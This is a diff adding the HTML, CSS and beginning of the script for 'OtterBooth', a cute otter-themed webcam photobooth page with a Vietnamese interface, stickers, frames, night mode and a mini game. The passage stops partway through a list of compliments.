@@ -1,0 +1,2601 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photobooth 📸</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Pixelify+Sans:wght@400..700&display=swap" rel="stylesheet" />
+    
+    <style>
+        :root {
+            --primary-color: #5599ff; 
+            --secondary-color: #e0f0ff;
+            --accent-color: #88ccff;
+            --dark-text: #1a4a76;
+            --booth-bg: #ffffff;
+        }
+
+        body {
+            font-family: 'Pixelify Sans', sans-serif;
+            background-color: var(--secondary-color);
+            background-image: radial-gradient(circle at 50% 50%, #ffffff 0%, #e0f0ff 100%);
+            display: flex; flex-direction: column; align-items: center;
+            min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box;
+            overflow-x: hidden;
+        }
+        
+        h1 {
+            color: var(--dark-text); margin-top: 0; margin-bottom: 20px;
+            text-shadow: 1px 1px 0px white; text-align: center;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* --- MAIN BOOTH --- */
+        #mainBooth { width: 100%; max-width: 1000px; display: flex; flex-direction: column; align-items: center; position: relative; z-index: 10; }
+
+        .booth-frame {
+            background-color: var(--booth-bg); padding: 25px; border-radius: 24px;
+            border: 8px solid var(--primary-color); 
+            box-shadow: 0 15px 35px rgba(0, 100, 200, 0.15);
+            display: flex; flex-direction: row; gap: 30px; width: 100%;
+            box-sizing: border-box; position: relative;
+        }
+
+        .left-column { flex: 1; display: flex; flex-direction: column; gap: 15px; min-width: 0; }
+
+        .screen-container {
+            position: relative; width: 100%; padding-top: 75%; 
+            background: #000; border-radius: 16px; border: 4px solid var(--primary-color);
+            overflow: hidden; box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
+        }
+
+        #liveVideo {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover; transform: scaleX(-1);
+        }
+
+        .countdown-timer {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            font-size: 80px; color: white; text-shadow: 0 0 20px var(--primary-color);
+            z-index: 10; display: none; font-weight: bold;
+        }
+
+        .custom-controls {
+            width: 100%; background: var(--secondary-color); padding: 15px; border-radius: 12px;
+            display: flex; flex-direction: column; align-items: center; gap: 12px; 
+            border: 2px dashed var(--primary-color); box-sizing: border-box;
+        }
+
+        .layout-toggle-container { display: flex; align-items: center; flex-wrap: wrap; gap: 15px; width: 100%; justify-content: center;}
+
+        .sticker-selector { 
+            display: grid; 
+            grid-template-columns: repeat(4, 1fr); 
+            gap: 10px; 
+            width: 100%; 
+        }
+
+        #frameListContainer, #stickerListContainer, #hatListContainer {
+            display: grid; 
+            grid-template-columns: repeat(2, 1fr); 
+            gap: 10px; 
+            margin-bottom: 15px; 
+        }
+
+        .sticker-btn {
+            font-family: 'Pixelify Sans', sans-serif; background: white; 
+            border: 2px solid var(--primary-color); font-size: 1rem; border-radius: 12px; 
+            cursor: pointer; transition: all 0.2s; padding: 8px 12px; color: var(--dark-text);
+            box-shadow: 0 4px 0 var(--accent-color);
+            display: flex; justify-content: center; align-items: center; text-align: center;
+        }
+        .sticker-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 0 var(--accent-color); }
+        .sticker-btn:active { transform: translateY(4px); box-shadow: 0 0 0 var(--accent-color); }
+        
+        .preset-btn { background-color: #fffacd; border-color: #ffd700; }
+        .delete-btn { background-color: #ffe6e6; border-color: #ff4d4d; color: #cc0000; box-shadow: 0 4px 0 #ff9999;}
+        .reset-btn { background-color: #ffb3b3; border-color: #ff6666; color: #990000; box-shadow: 0 4px 0 #ff9999;}
+
+        .controls { display: flex; gap: 12px; flex-wrap: wrap; justify-content: center; width: 100%; }
+
+        button.primary-btn, button.secondary-btn, button.toggle-btn { 
+            font-family: 'Pixelify Sans', sans-serif; padding: 12px 20px; font-size: 1.1rem; 
+            border-radius: 30px; cursor: pointer; transition: all 0.2s ease; font-weight: bold;
+        }
+        button.primary-btn { border: none; background-color: var(--primary-color); color: white; box-shadow: 0 4px 0 #3377dd; }
+        button.primary-btn:hover:not(:disabled) { background-color: #4488ee; transform: translateY(-2px); box-shadow: 0 6px 0 #3377dd; }
+        
+        button.secondary-btn { border: 2px solid var(--primary-color); background-color: white; color: var(--primary-color); }
+        button.toggle-btn { border: 2px solid #33aaff; background-color: #e6f7ff; color: #005599; }
+        
+        button:disabled { opacity: 0.5; cursor: not-allowed; box-shadow: none; transform: none; }
+
+        .right-column { width: 320px; display: flex; flex-direction: column; align-items: center; flex-shrink: 0; }
+
+        .canvas-wrapper { width: 100%; max-width: 100%; overflow: hidden; display: flex; justify-content: center;}
+        
+        #stripCanvas {
+            background-color: #e0f0ff; border-radius: 2px; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            max-width: 100%; height: auto; touch-action: none; border: 1px solid #ccc;
+        }
+
+        @media (max-width: 800px) {
+            .booth-frame { flex-direction: column; padding: 10px; }
+            .left-column, .right-column { width: 100%; }
+            
+            .sticker-selector {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 8px;
+            }
+
+            #autoDecorateToggle, #addUnderseaPreset {
+                grid-column: span 2;
+            }
+
+            .sticker-btn {
+                font-size: 0.85rem;
+                padding: 8px 5px;
+                min-height: 44px;
+            }
+
+            .controls {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                gap: 10px;
+            }
+
+            button.primary-btn, button.secondary-btn, button.toggle-btn {
+                font-size: 0.95rem;
+                padding: 10px;
+                width: 100%;
+            }
+
+            .layout-toggle-container {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+
+        /* --- TÍNH NĂNG MỚI: BOUNCING OTTER --- */
+        #bouncingOtter {
+            position: fixed;
+            top: 0; left: 0;
+            width: 130px; /* Kích thước rái cá bay */
+            z-index: 10000; /* Nổi lên trên cùng */
+            cursor: pointer;
+            user-select: none;
+            -webkit-user-drag: none; /* Tránh bị kéo nhầm dạng ảnh */
+        }
+
+        /* Khung chat (Tooltip) khi click vào rái cá */
+       #otterMessage {
+    position: fixed;
+    background: rgba(255, 255, 255, 0.95);
+    color: #ff4d4d;
+    padding: 10px 16px;
+    border-radius: 20px;
+    border: 3px solid #ff4d4d;
+    font-size: 1.05rem;
+    font-weight: bold;
+    z-index: 10001;
+    pointer-events: none;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    display: none;
+    white-space: normal;
+    max-width: 170px;
+    text-align: center;
+    line-height: 1.2;
+}
+        
+        /* Mũi tên chỉ xuống của khung chat */
+        #otterMessage::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            border-width: 10px 10px 0;
+            border-style: solid;
+            border-color: #ff4d4d transparent transparent transparent;
+        }
+        @media (max-width: 800px) {
+    #otterMessage {
+        font-size: 0.75rem !important;
+        padding: 6px 9px !important;
+        border-width: 2px !important;
+        max-width: 120px !important;
+        line-height: 1.15 !important;
+    }
+
+    #otterMessage::after {
+        bottom: -7px;
+        border-width: 7px 7px 0;
+    }
+}
+
+        /* --- TÍNH NĂNG MỚI: BONG BÓNG BAY --- */
+        .bubble {
+            position: fixed;
+            bottom: -100px;
+            z-index: 9998; /* Nổi lên trên nền và canvas, nhưng dưới rái cá */
+            pointer-events: none; /* Không cản trở click */
+            animation: floatUp linear forwards;
+            opacity: 0.8;
+            
+        }
+        /* Hiệu ứng phát sáng mặc định cho class bubble */
+        .bubble {
+            transition: filter 0.3s ease; /* Tạo hiệu ứng chuyển đổi mượt mà */
+        }
+        body.night-mode #bouncingOtter {
+            filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.4));
+        }
+        /* Chỉ khi body có class night-mode thì hiệu ứng này mới kích hoạt */
+        body.night-mode .bubble {
+            /* Màu vàng rực: rgba(255, 215, 0, 0.8) */
+            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.8)) 
+                    drop-shadow(0 0 20px rgba(255, 165, 0, 0.6));
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(0) translateX(0) scale(0.8); opacity: 0; } /* Bắt đầu tàng hình */
+            10% { opacity: 0.6; } /* Hiện ra dần */
+            50% { opacity: 0.005; } /* Đạt độ hiện tối đa ở giữa đường */
+            90% { opacity: 0.0000005; } /* Giữ nguyên độ hiện */
+            100% { transform: translateY(-120vh) translateX(-30px) scale(0.9); opacity: 0; } /* Kết thúc thì mờ hẳn đi */
+        }
+
+        /* Màu cho Night Mode */
+        body.night-mode {
+            background-color: #5e5e9c !important;
+            background-image: radial-gradient(circle at 50% 50%, #16213e 0%, #1a1a2e 100%) !important;
+        }
+
+        body.night-mode h1, body.night-mode h2, body.night-mode p {
+            color: #221f1f !important;
+        }
+
+        body.night-mode .booth-frame {
+            background-color: #16213e !important;
+            border-color: #4e4e6a !important;
+        }
+
+        /* Hiệu ứng bong bóng phát sáng trong đêm */
+        /* Hiệu ứng phát sáng cho bảng kết quả */
+        body.night-mode #stripCanvas {
+            background-color: #0d1117 !important; /* Màu nền canvas tối hơn */
+            box-shadow: 0 0 20px rgba(255, 255, 0, 0.3), 0 0 40px rgba(255, 165, 0, 0.2) !important;
+            border: 2px solid #30363d !important;
+        }
+
+        /* Hiệu ứng mặc định (Ngày) - Giữ nguyên như bạn đã viết */
+        h1, h2, h3, p {
+            transition: text-shadow 0.3s ease, color 0.3s ease;
+        }
+
+        /* Hiệu ứng khi bật Night Mode - SỬA LẠI THÀNH THẾ NÀY */
+        body.night-mode h1, 
+        body.night-mode h2, 
+        body.night-mode h3{
+            color: #ffd700 !important; 
+            text-shadow: 0 0 10px #ffcc00, 0 0 20px #ffcc00, 0 0 30px #ff8c00;
+        }
+
+        .dust-particle {
+            position: fixed;
+            width: 8px;
+            height: 8px;
+            background: #ffd700; /* Màu vàng của bụi tiên */
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+            animation: fadeOut 1s linear forwards;
+        }
+
+        @keyframes fadeOut {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(0); opacity: 0; }
+        }
+
+        .shooting-star {
+            position: fixed;
+            top: -50px;
+            background: linear-gradient(90deg, #fff, transparent);
+            transform: rotate(-45deg);
+            animation: shoot 2s linear forwards;
+            z-index: 9999;
+            pointer-events: none;
+        }
+
+        /* Sao nhỏ */
+        .shooting-star.small {
+            width: 60px;
+            height: 1px;
+            opacity: 0.6;
+        }
+
+        /* Sao bự và sáng */
+        .shooting-star.big {
+            width: 150px;
+            height: 3px;
+            box-shadow: 0 0 10px #fff, 0 0 20px #ffd700; /* Hiệu ứng sáng rực */
+            opacity: 1;
+        }
+
+        @keyframes shoot {
+            0% { transform: translate(0, 0) rotate(-45deg); }
+            100% { transform: translate(-100vw, 100vh) rotate(-45deg); }
+        }
+
+        #challengeBox {
+            position: absolute;
+            top: 20%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(255, 255, 255, 0.9);
+            padding: 15px 30px;
+            border-radius: 20px;
+            border: 4px solid var(--primary-color);
+            color: var(--dark-text);
+            font-size: 1.5rem;
+            font-weight: bold;
+            z-index: 100;
+            display: none; /* Mặc định ẩn */
+            pointer-events: none;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        body {
+    cursor: url('Assets/fish-photobooth/camerapage/stickers/otter_small.png'), auto;
+}
+button {
+    cursor: url('Assets/fish-photobooth/camerapage/stickers/otter_pointer.png'), pointer;
+}
+
+/* ===============================
+   OTTER MINI GAME AFTER DOWNLOAD
+=============================== */
+#otterMiniGameOverlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(224, 240, 255, 0.95);
+    z-index: 300000;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Pixelify Sans', sans-serif;
+    padding: 18px;
+    box-sizing: border-box;
+}
+
+body.night-mode #otterMiniGameOverlay {
+    background: rgba(10, 15, 35, 0.95);
+}
+
+.otter-game-box {
+    width: min(92vw, 540px);
+    height: min(82vh, 590px);
+    background: white;
+    border: 6px solid #5599ff;
+    border-radius: 28px;
+    box-shadow: 0 18px 40px rgba(0, 100, 200, 0.25);
+    position: relative;
+    overflow: hidden;
+    text-align: center;
+    padding: 20px;
+    box-sizing: border-box;
+}
+
+body.night-mode .otter-game-box {
+    background: #16213e;
+    border-color: #ffd700;
+    box-shadow: 0 0 25px rgba(255, 215, 0, 0.35);
+}
+
+.otter-game-close-x {
+    position: absolute;
+    top: 12px;
+    right: 12px;
+    width: 34px;
+    height: 34px;
+    border-radius: 50%;
+    border: 2px solid #ff4d4d;
+    background: #fff0f0;
+    color: #ff4d4d;
+    font-size: 1.1rem;
+    font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 3px 0 #ff9999;
+    z-index: 3;
+}
+
+.otter-game-title {
+    font-size: 1.6rem;
+    color: #1a4a76;
+    margin: 10px 36px 6px 36px;
+}
+
+body.night-mode .otter-game-title {
+    color: #ffd700;
+}
+
+.otter-game-info {
+    color: #555;
+    font-size: 1rem;
+    margin-bottom: 10px;
+}
+
+body.night-mode .otter-game-info {
+    color: #fff7c2;
+}
+
+.otter-game-stats {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 10px;
+    flex-wrap: wrap;
+}
+
+.otter-stat-pill {
+    background: #e0f0ff;
+    color: #1a4a76;
+    border: 2px solid #5599ff;
+    border-radius: 999px;
+    padding: 7px 14px;
+    font-weight: bold;
+}
+
+body.night-mode .otter-stat-pill {
+    background: #1a1a2e;
+    color: #ffd700;
+    border-color: #ffd700;
+}
+
+#otterGameArea {
+    position: relative;
+    width: 100%;
+    height: 350px;
+    background: linear-gradient(180deg, #e0f0ff, #fff7fb);
+    border: 3px dashed #5599ff;
+    border-radius: 22px;
+    overflow: hidden;
+}
+
+body.night-mode #otterGameArea {
+    background: radial-gradient(circle at 50% 20%, #243b6b, #0d1117);
+    border-color: #ffd700;
+}
+
+.falling-otter-item {
+    position: absolute;
+    top: -50px;
+    font-size: 2rem;
+    cursor: pointer;
+    user-select: none;
+    animation: fallDown linear forwards;
+    filter: drop-shadow(0 4px 5px rgba(0,0,0,0.15));
+}
+
+@keyframes fallDown {
+    from { transform: translateY(-60px) rotate(0deg); opacity: 1; }
+    to { transform: translateY(430px) rotate(25deg); opacity: 0.2; }
+}
+
+.otter-game-actions {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    flex-wrap: wrap;
+    margin-top: 12px;
+}
+
+.otter-game-btn {
+    font-family: 'Pixelify Sans', sans-serif;
+    border: none;
+    border-radius: 999px;
+    padding: 11px 18px;
+    background: #5599ff;
+    color: white;
+    font-weight: bold;
+    font-size: 1rem;
+    cursor: pointer;
+    box-shadow: 0 4px 0 #3377dd;
+}
+
+.otter-game-btn.close-game {
+    background: #ff4d4d;
+    box-shadow: 0 4px 0 #cc0000;
+}
+
+.otter-game-btn.restart-game {
+    background: #ffd700;
+    color: #1a4a76;
+    box-shadow: 0 4px 0 #c9a600;
+}
+
+.otter-game-btn:hover {
+    transform: translateY(-2px);
+}
+
+#otterGameResult {
+    margin-top: 9px;
+    color: #ff4d8d;
+    font-size: 1.05rem;
+    font-weight: bold;
+    min-height: 26px;
+}
+
+.otter-game-hint {
+    margin-top: 6px;
+    color: #777;
+    font-size: 0.85rem;
+}
+
+body.night-mode .otter-game-hint {
+    color: #fff7c2;
+}
+
+@media (max-width: 600px) {
+    .otter-game-box {
+        height: 82vh;
+        padding: 14px;
+    }
+
+    #otterGameArea {
+        height: 330px;
+    }
+
+    .otter-game-title {
+        font-size: 1.2rem;
+        margin-left: 32px;
+        margin-right: 32px;
+    }
+
+    .otter-game-info {
+        font-size: 0.9rem;
+    }
+
+    .falling-otter-item {
+        font-size: 1.7rem;
+    }
+}
+
+    </style>
+</head>
+<body>
+    <div id="tutorialModal" style="display: flex; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 200000; justify-content: center; align-items: center; padding: 20px;">
+    <div style="background: white; padding: 30px; border-radius: 24px; max-width: 500px; text-align: center; border: 5px solid var(--primary-color);">
+        <h2 style="color: var(--dark-text);">🦦 Hé Lô Tuấn Anh bảnh zai đến với OtterBooth! 🦦</h2>
+        <p style="font-size: 1.1rem; color: #555; text-align: left; margin-bottom: 20px; line-height: 1.5;">
+            ✨ **Hướng dẫn nhanh:**✨ (🐳 : siêu recommend làm theo nhaaaaaa)<br>
+            1. 🍀🐳Chạm vào bé rái cá để xem tin nhắn yêu đời.🐳🍀<br>
+            2. Chạm vào màn hình để chụp hình.<br>
+            3. 🐳Dùng các nút để thêm Sticker, Mũ, Khung.🐳<br>
+            4. Auto-Mode ON/OFF sẽ spam sticker cực đã.<br>
+            5. 🍀🐳🐻 Bật Night Mode để thấy sự kỳ diệu!🐻 🐳🍀<br>
+            6. 🍀🐳 Nên dùng máy tính để trải nghiệm tốt nhất nghen<br>
+            7. Lia chuột vào góc và cạnh ảnh/mũ/sticker để edit tuỳ ý <br>
+            8. 🍀🐳 Thử thách Rái Cá siêu vui, bật lên để chơi nha! 🐳<br>
+            9. 🐳🐻 Đừng quên tải ảnh về khoe bạn bè nhé! 🐻🐳<br>
+            
+<button 
+    onclick="document.getElementById('tutorialModal').style.display='none'" 
+    class="primary-btn" 
+    style="width: 100%; margin-top: 20px;"
+>
+    Đã hiểu gòi! 🐾
+</button>
+
+<button 
+    id="tutorialNightRecommendBtn"
+    class="primary-btn"
+    style="
+        width: 100%;
+        margin-top: 12px;
+        background: linear-gradient(135deg, #1a1a2e, #f1c40f);
+        box-shadow: 0 4px 0 #8a6d00;
+        border: none;
+    "
+>
+    🐳 Recommend: Thử Night/Day Magic nhó ông ✨
+</button>    </div>
+</div>
+    
+    <img id="bouncingOtter" src="Assets/fish-photobooth/camerapage/stickers/otter_wink.gif" alt="Otter Bouncing">
+    <div id="otterMessage">🫣Đồ đáng yêu🫣</div>
+
+    <div id="mainBooth">
+        <h1>✨ Decorate Your Photos ✨</h1>
+        <h1>°🦦°•࿐°‧ 𓆝·｡OtterBooth.ೃ࿔*:･⋅˚🦦°</h1>
+        <h2>Ask me anything for more "ottermation"</h2>
+
+        <div class="booth-frame">
+            <div class="left-column">
+                <div class="screen-container">
+                    <video id="liveVideo" autoplay playsinline></video>
+                    <div id="challengeBox"></div>
+                    <div class="countdown-timer" id="countdown">3</div>
+                </div>
+
+                <div class="custom-controls">
+                    <div class="layout-toggle-container">
+                        <button id="toggleLayoutBtn" class="toggle-btn">🔄 Switch Layout: Vertical Strip</button>
+                        <div style="display: flex; align-items: center; gap: 5px;">
+                            <label style="font-weight: bold; color: var(--dark-text); font-size: 0.9rem;">Ombre Top:</label>
+                            <input type="color" id="colorPicker1" value="#e0f0ff" style="cursor: pointer; border:none; width: 30px; height: 30px;">
+                            <label style="font-weight: bold; color: var(--dark-text); font-size: 0.9rem; margin-left: 5px;">Bottom:</label>
+                            <input type="color" id="colorPicker2" value="#ffb6c1" style="cursor: pointer; border:none; width: 30px; height: 30px;">
+                        </div>
+                    </div>
+                    
+                    
+                    <div class="sticker-selector">
+                        <button class="sticker-btn preset-btn" onclick="document.getElementById('tutorialModal').style.display='flex'">❓ Hướng dẫn</button>
+                        <button class="sticker-btn" onclick="document.getElementById('frameModal').style.display='flex'" style="background-color: #fffacd; border: 2px solid #ffd700;">
+                            🖼️ Chọn Khung</button>
+                        <button class="sticker-btn" onclick="document.getElementById('stickerModal').style.display='flex'" style="background-color: #fffacd; border: 2px solid #ffd700;">
+                            ✨ Chọn Sticker
+                        </button>
+                        <button class="sticker-btn" onclick="document.getElementById('hatModal').style.display='flex'" style="background-color: #fffacd; border: 2px solid #ffd700;">
+                            🧢 Chọn Mũ
+                        </button>
+                        <button class="sticker-btn preset-btn" id="toggleChallengeBtn">🎲 Thử Thách Rái Cá: OFF</button>
+                        <button id="musicToggleBtn" class="sticker-btn" style="background-color: #fffacd; border: 2px solid #ffd700;">
+                            🎵 Tắt Nhạc
+                        </button>
+                        <button class="sticker-btn preset-btn" id="nightModeToggle" style="background-color: #2c3e50; border-color: #34495e; color: white;">🌙 Night Mode: OFF</button>
+                        <button class="sticker-btn" onclick="resizeSelected(1.25)" style="background-color: #e6f7ff; border-color: #33aaff;">➕ Phóng To</button>
+                        <button class="sticker-btn" onclick="resizeSelected(0.95)" style="background-color: #e6f7ff; border-color: #111213;">➖ Thu Nhỏ</button>
+
+                        <button class="sticker-btn preset-btn" id="autoDecorateToggle">✨ Auto-Mode: OFF</button>
+                        <button class="sticker-btn preset-btn" id="addUnderseaPreset">✨ Auto Decorate (Mixed Undersea)</button>
+            
+                        
+                        <button class="sticker-btn delete-btn" id="deleteSelectedBtn">🗑️ Delete Selected</button>
+                        <button class="sticker-btn reset-btn" id="clearStickersBtn">Reset All</button>
+                    </div>
+                </div>
+
+                <div class="controls">
+                    <button id="takePhoto" class="primary-btn">📸 Capture</button>
+                    <button id="uploadTriggerBtn" class="secondary-btn">📁 Upload</button>
+                    <input type="file" id="uploadPhotoInput" accept="image/*" style="display: none;">
+                    <button id="clearStripBtn" class="secondary-btn">🗑️ Clear Photos</button>
+                    <button id="downloadBtn" class="primary-btn">💾 Download Photo</button>
+                 </div>
+            </div>
+
+            <div class="right-column">
+                <h2 style="margin: 0 0 10px 0; font-size: 1.3rem; color: var(--dark-text);">Your Result</h2>
+                <div class="canvas-wrapper">
+                    <canvas id="stripCanvas"></canvas>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="frameModal" style="display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 100000; justify-content: center; align-items: center;">
+        <div style="background: white; padding: 20px; border-radius: 20px; text-align: center; max-width: 90%; max-height: 90vh; overflow-y: auto;">
+            <h3 style="margin-top: 0; color: #1a4a76;">Chọn Khung Ảnh</h3>
+            
+            <div id="frameListContainer">
+                <button class="sticker-btn frame-strip" onclick="setFrame('Assets/frame/frame1.png')">Cute Hột Me</button>
+                <button class="sticker-btn frame-strip" onclick="setFrame('Assets/frame/frame2.png')">Giấy Kết Hôn</button>
+                <button class="sticker-btn frame-strip" onclick="setFrame('Assets/frame/otter gangster.png')">Rái Cá Ngầu Lòi</button>
+                <button class="sticker-btn frame-strip" onclick="setFrame('Assets/frame/y2k.png')">Y2K</button>
+                <button class="sticker-btn frame-strip" onclick="setFrame('Assets/frame/One Piece.png')">One Piece</button>
+                <button class="sticker-btn frame-strip" onclick="setFrame('Assets/frame/BYO.png')">Be Your Self</button>
+                <button class="sticker-btn frame-strip" onclick="setFrame('Assets/frame/otter memo.png')">Rái Cá Memories</button>
+                <button class="sticker-btn frame-strip" onclick="setFrame('Assets/frame/otterly.png')">Rái Cá Cute</button>
+                <button class="sticker-btn frame-strip" onclick="setFrame('Assets/frame/otter police.png')">Cảnh Sát Rái Cá</button>
+
+                <button class="sticker-btn frame-grid" onclick="setFrame('Assets/frame/grid1.png')" style="display:none;">Grid Mẫu 1</button>
+                <button class="sticker-btn frame-grid" onclick="setFrame('Assets/frame/grid2.png')" style="display:none;">Grid Mẫu 2</button>
+                <button class="sticker-btn frame-grid" onclick="setFrame('Assets/frame/grid3.png')" style="display:none;">Grid Mẫu 3</button>
+
+                <button class="sticker-btn" onclick="setFrame(null)">Bỏ Khung</button>
+            </div>
+
+            <input type="file" id="uploadFrameInput" accept="image/png" style="display: none;">
+            <button class="primary-btn" onclick="document.getElementById('uploadFrameInput').click()" style="width: 100%; margin-bottom: 10px; background-color: #33aaff; border: none;">📁 Tải Khung Của Bạn Lên</button>
+            
+            <button class="primary-btn" onclick="document.getElementById('frameModal').style.display='none'" style="width: 100%; background: #ff4d4d; box-shadow: 0 4px 0 #cc0000; border: none;">Đóng</button>
+        </div>
+    </div>
+
+    <div id="stickerModal" style="display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 100000; justify-content: center; align-items: center;">
+        <div style="background: white; padding: 20px; border-radius: 20px; text-align: center; max-width: 90%; max-height: 90vh; overflow-y: auto;">
+            <h3 style="margin-top: 0; color: #1a4a76;">Chọn Sticker</h3>
+            
+            <div id="stickerListContainer">
+                <button class="sticker-btn" onclick="handleSticker('Assets/fish-photobooth/camerapage/stickers/fish.png', false); closeStickerModal()">🐟 Fish</button>
+                <button class="sticker-btn" onclick="handleSticker('Assets/fish-photobooth/camerapage/stickers/octopus.png', false); closeStickerModal()">🐙 Octopus</button>
+                <button class="sticker-btn" onclick="handleSticker('Assets/fish-photobooth/camerapage/stickers/axolotl.png', false); closeStickerModal()">🦎 Axolotl</button>
+                <button class="sticker-btn" onclick="handleSticker('Assets/fish-photobooth/camerapage/stickers/otter.png', false); closeStickerModal()">🐾 Otter Heart</button>
+                <button class="sticker-btn" onclick="handleSticker('Assets/fish-photobooth/camerapage/stickers/seaotter.png', false); closeStickerModal()">🦦 Sea Otter</button>
+                <button class="sticker-btn" onclick="handleSticker('Assets/fish-photobooth/camerapage/stickers/otterface.png', false); closeStickerModal()">🐻 Otter Face</button>
+                
+                <button class="sticker-btn" onclick="handleSticker('⭐', true); closeStickerModal()">⭐ Star</button>
+                <button class="sticker-btn" onclick="handleSticker('♡', true); closeStickerModal()">❤️ Heart</button>
+                <button class="sticker-btn" onclick="handleSticker('✨', true); closeStickerModal()">✨ Sparkles</button>
+                <button class="sticker-btn" onclick="handleSticker('🐻', true); closeStickerModal()">🐻 Gấu Nâu</button>
+            </div>
+            
+            <button class="primary-btn" onclick="closeStickerModal()" style="width: 100%; background: #ff4d4d; border: none;">Đóng</button>
+        </div>
+    </div>
+
+    <div id="hatModal" style="display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 100000; justify-content: center; align-items: center;">
+        <div style="background: white; padding: 20px; border-radius: 20px; text-align: center; max-width: 90%; max-height: 90vh; overflow-y: auto;">
+            <h3 style="margin-top: 0; color: #1a4a76;">Chọn Mũ</h3>
+            
+            <div id="hatListContainer">
+                <button class="sticker-btn" onclick="handleSticker('Assets/fish-photobooth/camerapage/stickers/otterHat.png', false); closeHatModal()">🦦 Mũ Rái Cá</button>
+                <button class="sticker-btn" onclick="handleSticker('Assets/fish-photobooth/camerapage/stickers/Hat.png', false); closeHatModal()">🧢 Mũ Lưỡi Trai</button>
+                <button class="sticker-btn" onclick="handleSticker('Assets/fish-photobooth/camerapage/stickers/crown.png', false); closeHatModal()">👑 Vương Miện</button>
+            </div>
+            
+            <button class="primary-btn" onclick="closeHatModal()" style="width: 100%; background: #ff4d4d; border: none;">Đóng</button>
+        </div>
+    </div>
+    
+
+    <!-- Otter Mini Game Overlay -->
+    <div id="otterMiniGameOverlay">
+        <div class="otter-game-box">
+            <button id="closeOtterGameX" class="otter-game-close-x" type="button">✕</button>
+
+            <div class="otter-game-title">🦦 Otter Bonus Game!</div>
+            <div class="otter-game-info">Bắt tim rái cá trong 10 giây để mở khóa lời khen bí mật 💖</div>
+
+            <div class="otter-game-stats">
+                <div class="otter-stat-pill">Score: <span id="otterGameScore">0</span></div>
+                <div class="otter-stat-pill">Time: <span id="otterGameTime">10</span>s</div>
+            </div>
+
+            <div id="otterGameArea"></div>
+
+            <div id="otterGameResult"></div>
+
+            <div class="otter-game-actions">
+                <button id="restartOtterGameBtn" class="otter-game-btn restart-game" type="button">Chơi lại 🔁</button>
+                <button id="closeOtterGameBtn" class="otter-game-btn close-game" type="button">Thoát game 🐾</button>
+            </div>
+
+            <div class="otter-game-hint">Tip: bấm ESC hoặc bấm nền bên ngoài để thoát.</div>
+        </div>
+    </div>
+
+    <audio id="bg-music" loop>
+        <source src="Assets/So Many Cute Things In The World.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // --- LOGIC: RÁI CÁ BAY NẢY (BOUNCING OTTER) ---
+        const otter = document.getElementById('bouncingOtter');
+        const otterMsg = document.getElementById('otterMessage');
+
+        // Auto compliment list - câu ngắn để bubble nhìn cute hơn
+        const autoOtterCompliments = [
+            "Tuấn Anh bảnh quá! 🦦",
+            "Cute xỉu luôn á!",
+            "Otter approved 💖",
+            "Slay dữ vậy ✨",
+            "100/10 nha ⭐",
+            "Main character đó!",
+            "Đẹp trai quá trời lun ó!",
+            "Cute hết cứu òi cậu ơi 🫧",
+            "Rái cá ngại rồi 🫣",
+            "Bảnh level max!",
+            "Quá là slay 💅",
+            "Nhìn yêu ghê!",
+            "Tấm này lưu trong tim nhoa!",
+            "Otter prince 🦦",
+            "Cute hơn rái cá!",
+            "Xịn quá ông ơi!",
+            "Đỉnh của chóp!",
+            "Rất là cháy nha!",
